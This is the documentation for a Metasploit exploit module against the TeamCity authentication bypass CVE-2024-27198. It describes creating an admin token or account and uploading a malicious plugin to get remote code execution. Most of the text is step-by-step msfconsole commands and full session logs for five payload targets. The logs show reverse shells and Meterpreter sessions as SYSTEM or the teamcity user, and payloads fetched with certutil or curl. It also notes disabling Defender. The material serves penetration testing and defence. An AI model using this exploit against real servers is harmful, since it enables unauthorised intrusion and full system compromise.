## Vulnerable Application
This module exploits an authentication bypass vulnerability in JetBrains TeamCity. An unauthenticated
attacker can leverage this to access the REST API and create a new administrator access token. This token
can be used to upload a plugin which contains a Metasploit payload, allowing the attacker to achieve
unauthenticated RCE on the target TeamCity server. On older versions of TeamCity, access tokens do not exist
so the exploit will instead create a new administrator account before uploading a plugin. Older version of
TeamCity have a debug endpoint (/app/rest/debug/process) that allows for arbitrary commands to be executed,
however recent version of TeamCity no longer ship this endpoint, hence why a plugin is leveraged for code
execution instead, as this is supported on all versions tested.

For a technical analysis of the vulnerability, read our [Rapid7 Analysis](https://attackerkb.com/topics/K3wddwP3IJ/cve-2024-27198/rapid7-analysis).

## Testing
[Download](https://www.jetbrains.com/teamcity/download/) and
[install](https://www.jetbrains.com/help/teamcity/install-and-start-teamcity-server.html) a vulnerable version of
TeamCity for either Windows or Linux, e.g. version 2023.11.3. By default the server will listen for HTTP
connections on port 8111 (Older version of the product listen on port 80 by default).

The exploit has been tested against:
 * TeamCity 2023.11.3 (build 147512) running on Windows Server 2022
 * TeamCity 2023.11.2 (build 147486) running on Windows Server 2022
 * TeamCity 2023.11.3 (build 147512) running on Linux
 * TeamCity 2018.2.4 (build 61678) running on Windows Server 2016

## Verification Steps
Note: On Windows, disable Defender if you are using the default payloads.

Note: The check routine will display the target platform, this can be used to decide what target to select if the
command payloads are to be used. The Java payloads are platform agnostic.

1. Start msfconsole
2. `use exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198`
3. `set RHOST <TARGET_IP_ADDRESS>`
4. `set target 0`
5. `set payload java/meterpreter/reverse_tcp`
6. `set LHOST eth0`
7. `check`
8. `exploit`

## Options

### TEAMCITY_ADMIN_ID
The user ID of an administrator account on the server. As the first user created during installation is an
administrator account, the ID will be 1 by default.

## Scenarios

### Java

```
msf6 > use exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198 
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set RHOST 192.168.86.68
RHOST => 192.168.86.68
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > check
[+] 192.168.86.68:8111 - The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Windows Server 2022.
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Java
    1   Java Server Page
    2   Windows Command
    3   Linux Command
    4   Unix Command


msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set target 0
target => 0
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set payload java/meterpreter/reverse_tcp 
payload => java/meterpreter/reverse_tcp
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set LHOST eth0
LHOST => eth0
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > show options

Module options (exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS             192.168.86.68    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT              8111             yes       The target port (TCP)
   SSL                false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI          /                yes       The base path to TeamCity
   TEAMCITY_ADMIN_ID  1                yes       The ID of an administrator account to authenticate as
   VHOST                               no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  eth0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > exploit

[*] Started reverse TCP handler on 192.168.86.42:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Windows Server 2022.
[*] Created authentication token: eyJ0eXAiOiAiVENWMiJ9.c1hvczdQOUFMX2J5Z3NiZU9MYzFDSEdPQ213.Mzk3NmQ5MmQtOTBmOC00OGNjLTkyNWEtMzRhYWI2YzUwMTU4
[*] Uploading plugin: TdbCU0EE
[*] Sending stage (57971 bytes) to 192.168.86.68
[*] Meterpreter session 1 opened (192.168.86.42:4444 -> 192.168.86.68:53099) at 2024-02-23 14:13:22 +0000
[*] Deleting the plugin...
[*] Deleting the authentication token...
[!] This exploit may require manual cleanup of 'C:\TeamCity\webapps\ROOT\plugins\TdbCU0EE' on the target
[!] This exploit may require manual cleanup of 'C:\TeamCity\work\Catalina\localhost\ROOT\TC_147512_TdbCU0EE' on the target
[!] This exploit may require manual cleanup of 'C:\ProgramData\JetBrains\TeamCity\system\caches\plugins.unpacked\TdbCU0EE' on the target

meterpreter > getuid
Server username: WIN-CMULENHFCK7$
meterpreter > sysinfo
Computer        : WIN-CMULENHFCK7
OS              : Windows Server 2022 10.0 (amd64)
Architecture    : x64
System Language : en_IE
Meterpreter     : java/windows
meterpreter > 
```

### Java Server Page

```
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set target 1
target => 1
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set payload java/jsp_shell_reverse_tcp 
payload => java/jsp_shell_reverse_tcp
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > show options

Module options (exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS             192.168.86.68    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT              8111             yes       The target port (TCP)
   SSL                false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI          /                yes       The base path to TeamCity
   TEAMCITY_ADMIN_ID  1                yes       The ID of an administrator account to authenticate as
   VHOST                               no        HTTP server virtual host


Payload options (java/jsp_shell_reverse_tcp):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   CreateSession  true             no        Create a new session for every successful login
   LHOST          eth0             yes       The listen address (an interface may be specified)
   LPORT          4444             yes       The listen port
   SHELL                           no        The system shell to use.


Exploit target:

   Id  Name
   --  ----
   1   Java Server Page



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > check
[+] 192.168.86.68:8111 - The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Windows Server 2022.
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > exploit

[*] Started reverse TCP handler on 192.168.86.42:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Windows Server 2022.
[*] Created authentication token: eyJ0eXAiOiAiVENWMiJ9.OFNzM2pkZW5IMXp0V2stY2VqWEtOZkpoOW9Z.ZWU4Y2I2ODgtZDQzMS00ZjE5LTk5NzgtNGY5YzMwM2VmMjcx
[*] Uploading plugin: jWHObFbu
[*] Deleting the plugin...
[*] Deleting the authentication token...
[*] Command shell session 2 opened (192.168.86.42:4444 -> 192.168.86.68:53110) at 2024-02-23 14:20:35 +0000
[!] This exploit may require manual cleanup of 'C:\TeamCity\webapps\ROOT\plugins\jWHObFbu' on the target
[!] This exploit may require manual cleanup of 'C:\TeamCity\work\Catalina\localhost\ROOT\TC_147512_jWHObFbu' on the target
[!] This exploit may require manual cleanup of 'C:\ProgramData\JetBrains\TeamCity\system\caches\plugins.unpacked\jWHObFbu' on the target


Shell Banner:
Microsoft Windows [Version 10.0.20348.1547]
(c) Microsoft Corporation. All rights reserved.
-----
          

c:\TeamCity\bin>whoami
whoami
nt authority\system

c:\TeamCity\bin>
```

### Windows Command

Note: Ensure the target is a Windows target by confirming via the `check` command.

Note: Ensure the `FETCH_COMMAND` is set to a suitable value, such as `CERTUTIL`.

Note: Ensure the `FETCH_WRITABLE_DIR` is set to a suitable value, such as `%TEMP%`.

```
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set target 2
target => 2
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set payload cmd/
Display all 623 possibilities? (y or n)
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set payload cmd/windows/http/x64/meterpreter/reverse_tcp
payload => cmd/windows/http/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > show options

Module options (exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS             192.168.86.68    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT              8111             yes       The target port (TCP)
   SSL                false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI          /                yes       The base path to TeamCity
   TEAMCITY_ADMIN_ID  1                yes       The ID of an administrator account to authenticate as
   VHOST                               no        HTTP server virtual host


Payload options (cmd/windows/http/x64/meterpreter/reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   EXITFUNC            process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   FETCH_COMMAND       CERTUTIL         yes       Command to fetch payload (Accepted: CURL, TFTP, CERTUTIL)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      qaZbVnKb         no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR  %TEMP%           yes       Remote writable dir to store payload; cannot contain spaces.
   LHOST               eth0             yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   Windows Command



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > check
[+] 192.168.86.68:8111 - The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Windows Server 2022.
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > exploit

[*] Started reverse TCP handler on 192.168.86.42:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Windows Server 2022.
[*] Created authentication token: eyJ0eXAiOiAiVENWMiJ9.ZHpiZmNJMlB1b2Zqam5NSkw0bk1JS1hFdlZz.MjVjZDQ3YjEtODM2YS00Y2I1LWE3ODEtMzUzMTgzMDc4NjA3
[*] Uploading plugin: RzeS0eJP
[*] Deleting the plugin...
[*] Sending stage (201798 bytes) to 192.168.86.68
[*] Deleting the authentication token...
[+] Deleted C:\TeamCity\work\Catalina\localhost\ROOT\TC_147512_RzeS0eJP
[*] Meterpreter session 3 opened (192.168.86.42:4444 -> 192.168.86.68:53113) at 2024-02-23 14:21:43 +0000
[!] This exploit may require manual cleanup of 'C:\ProgramData\JetBrains\TeamCity\system\caches\plugins.unpacked\RzeS0eJP' on the target

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WIN-CMULENHFCK7
OS              : Windows Server 2022 (10.0 Build 20348).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > pwd
c:\TeamCity\bin
meterpreter > 
```

### Linux Command

Note: Ensure the target is a Linux target by confirming via the `check` command.

Note: Ensure the `FETCH_COMMAND` is set to a suitable value, such as `CURL`.

Note: Ensure the `FETCH_WRITABLE_DIR` is set to a suitable value, such as `/tmp`.

```
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set RHOSTS 192.168.86.43
RHOSTS => 192.168.86.43
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > check
[+] 192.168.86.43:8111 - The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Linux.
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set target 3
target => 3
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set payload cmd/linux/http/x64/meterpreter/reverse_tcp 
payload => cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set FETCH_WRITABLE_DIR /tmp
FETCH_WRITABLE_DIR => /tmp
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > show options

Module options (exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS             192.168.86.43    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT              8111             yes       The target port (TCP)
   SSL                false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI          /                yes       The base path to TeamCity
   TEAMCITY_ADMIN_ID  1                yes       The ID of an administrator account to authenticate as
   VHOST                               no        HTTP server virtual host


Payload options (cmd/linux/http/x64/meterpreter/reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_COMMAND       CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      cWStJXIvdtmM     no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR  /tmp             yes       Remote writable dir to store payload; cannot contain spaces
   LHOST               eth0             yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   3   Linux Command



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > exploit

[*] Started reverse TCP handler on 192.168.86.42:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Linux.
[*] Created authentication token: eyJ0eXAiOiAiVENWMiJ9.NVAxemdUTVFnSlp4Um1jdkN5Yi12dk1wNkJR.NTIyNTA1NjgtOWM3Zi00YzdiLTkzMTEtYTc2Y2ZkZjRjYTVl
[*] Uploading plugin: CyGZ1ME5
[*] Sending stage (3045380 bytes) to 192.168.86.43
[*] Deleting the plugin...
[*] Meterpreter session 4 opened (192.168.86.42:4444 -> 192.168.86.43:55572) at 2024-02-23 14:24:37 +0000
[*] Deleting the authentication token...
[!] This exploit may require manual cleanup of '/opt/TeamCity/work/Catalina/localhost/ROOT/TC_147512_CyGZ1ME5' on the target
[!] This exploit may require manual cleanup of '/home/teamcity/.BuildServer/system/caches/plugins.unpacked/CyGZ1ME5' on the target

meterpreter > getuid
Server username: teamcity
meterpreter > sysinfo
Computer     : 192.168.86.43
OS           : Ubuntu 22.04 (Linux 6.5.0-15-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > pwd
/opt/TeamCity/bin
meterpreter > 
```

### Unix Command

This target is suitable for targeting Linux, OSX, or any of the unofficially supported platforms such as
Solaris, FreeBSD and so on.

Note: Ensure the target is a Unix-like target by confirming via the `check` command.

```
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set target 4
target => 4
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set payload cmd/unix/reverse_bash
payload => cmd/unix/reverse_bash
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > show options

Module options (exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS             192.168.86.43    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT              8111             yes       The target port (TCP)
   SSL                false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI          /                yes       The base path to TeamCity
   TEAMCITY_ADMIN_ID  1                yes       The ID of an administrator account to authenticate as
   VHOST                               no        HTTP server virtual host


Payload options (cmd/unix/reverse_bash):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   CreateSession  true             no        Create a new session for every successful login
   LHOST          eth0             yes       The listen address (an interface may be specified)
   LPORT          4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   4   Unix Command



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > check
[+] 192.168.86.43:8111 - The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Linux.
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > exploit

[*] Started reverse TCP handler on 192.168.86.42:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Linux.
[*] Created authentication token: eyJ0eXAiOiAiVENWMiJ9.ME9Xa2xIMDhSYmtxTVBMaThGWDdObVJaakZ3.MDdhNDM0NzktYWM3ZC00NzAzLTk4ZmUtNjVlMzQ3MGMwOGIz
[*] Uploading plugin: 4V9kOD1D
[*] Deleting the plugin...
[*] Deleting the authentication token...
[+] Deleted /opt/TeamCity/work/Catalina/localhost/ROOT/TC_147512_4V9kOD1D
[+] Deleted /home/teamcity/.BuildServer/system/caches/plugins.unpacked/4V9kOD1D
[*] Command shell session 5 opened (192.168.86.42:4444 -> 192.168.86.43:44878) at 2024-02-23 14:27:04 +0000

id
uid=1002(teamcity) gid=1002(teamcity) groups=1002(teamcity)
uname -a
Linux teamcity-ubuntu-test 6.5.0-15-generic #15~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Fri Jan 12 18:54:30 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
pwd
/opt/TeamCity/bin
```
